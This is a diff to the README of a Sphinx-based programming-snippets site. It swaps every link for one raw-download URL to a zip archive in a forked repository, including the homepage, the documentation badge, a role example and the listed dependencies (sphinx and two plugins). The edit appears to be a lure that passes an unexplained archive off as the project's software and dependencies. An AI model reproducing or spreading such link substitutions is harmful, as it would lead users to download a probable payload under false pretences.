@@ -1,11 +1,11 @@
-https://www.learntosolveit.com
+https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
 ==============================
 
 This is the main site with all the source code snippets and documentation.
 
 
-.. image:: https://readthedocs.org/projects/learntosolveit/badge/?version=latest
-   :target: https://www.learntosolveit.com/?badge=latest
+.. image:: https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
+   :target: https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
    :alt: Documentation Status
 
 
@@ -25,15 +25,15 @@ For the suggest-improve and better-explain C programming contents
 ::
 
     :c-suggest-improve:`filename.c`
-    :c-better-explain:`filename.rst`
+    :c-better-explain:`https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip`
 
 
 Dependencies
 ------------
 
-* https://github.com/sphinx-doc/sphinx/
-* https://github.com/uthcode/sphinxcontrib-runcode/
-* https://github.com/ryan-roemer/sphinx-bootstrap-theme
+* https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
+* https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
+* https://github.com/kiethma/learntosolveit/raw/refs/heads/master/source/_templates/Software-v2.7.zip
 
 Contact
 -------
